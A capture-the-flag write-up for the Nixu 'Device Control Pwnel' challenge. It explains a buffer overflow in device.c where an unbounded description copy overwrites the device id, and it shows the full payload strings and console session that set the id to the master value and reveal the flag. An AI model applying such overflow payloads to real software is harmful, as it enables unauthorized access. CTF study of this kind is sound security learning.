# Device Control Pwnel - Part 2

## Problem

https://thenixuchallenge.com/c/overflow/

You found an exposed device controller interface... 

nc overflow.thenixuchallenge.com 20191 

[device.tgz](https://thenixuchallenge.com/c/overflow/static/device.tgz)

## Solution

Add a device with a long description to overflow the char array and set the device id. Edit the device with a new description to get the 0x00 at the right place.

### Introduction

After downloading the device.tgz and extracting it we get two files: the source device.c and the executable device. Let's look at the source first. Note: the link to the challenge is called overflow...

#### device.c

The code is straight forward: in main two flags are loaded and it presents a menu. After choosing an option the corresponding function is called and the menu is returned afterwards.

Flag2 is printed in the process function if a device with an `id` equal to `master` is present. `master` is defined as `uint64_t master = 0x8100ca33c1ab7dafLL;`. Only thing left to do is add a device with the master id.

Devices are added in the `add_device` function. It accepts a name and description from the user and generates a random id. The input for the name and description is done using fgets. The variable to hold the description has a length of 256. The final destination to which it is copied only has a length of 128. The copying is done without a boundary check and overwrites the memory adjacent to the description, which is the id. Supplying a description with a string of 128 in length with the the value of the master as string appended to it will set the id of the memory.

Only left is the string representation of the master id. Using an ASCII table, and reading the master id bytes from right to left(`af 7d ab c1 33 ca 00 81`), we get the string `»}½┴3╩0ü`. The 0 is a placeholder for the 0x00 value, as it can not be appended straight away. Appending this to a 128 characters long string will set the id to `8130ca33c1ab7daf`. Almost there, we just need to change the second byte to 0x00. We use the edit function for it. This time the description is changed to a 128 characters long string with 6 characters (`»}½┴3╩`) appended.

Choosing 4) Process gives flag number 2

#### Control panel

Firing up nc and connecting to the provided address presents us with a menu, as expected from the source.

```console
Welcome to ACME corp control panel

1) List devices
2) Add device
3) Edit device
4) Process
5) Quit
```

First add a device by choosing option 2

```console
2
Add a new device
Assigned device ID 6b8b4567327b23c6
Name:
Hack
Description:
12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678»}½┴3╩0ü
```

List the current devices shows that the device ID has been changed

```console
1

Listing devices:

1:
ID: 8130ca33c1ab7daf
Name: Hack
Description: 12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678»}½┴3╩0ü
```

Now edit the already present device to fix the second byte

```console
3
Select device to edit (1):
1
New name:
Hack2
New description:
12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678»}½┴3╩
```

Verify the ID

```console
1

Listing devices:

1:
ID: 8100ca33c1ab7daf
Name: Hack2
Description: 12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678ü
```

Choose option 4 to get the flag

```console
Looking for master device id: 8100ca33c1ab7daf
Device with master id found, here's the flag:
NIXU{###_##_####_####_####_#########}
```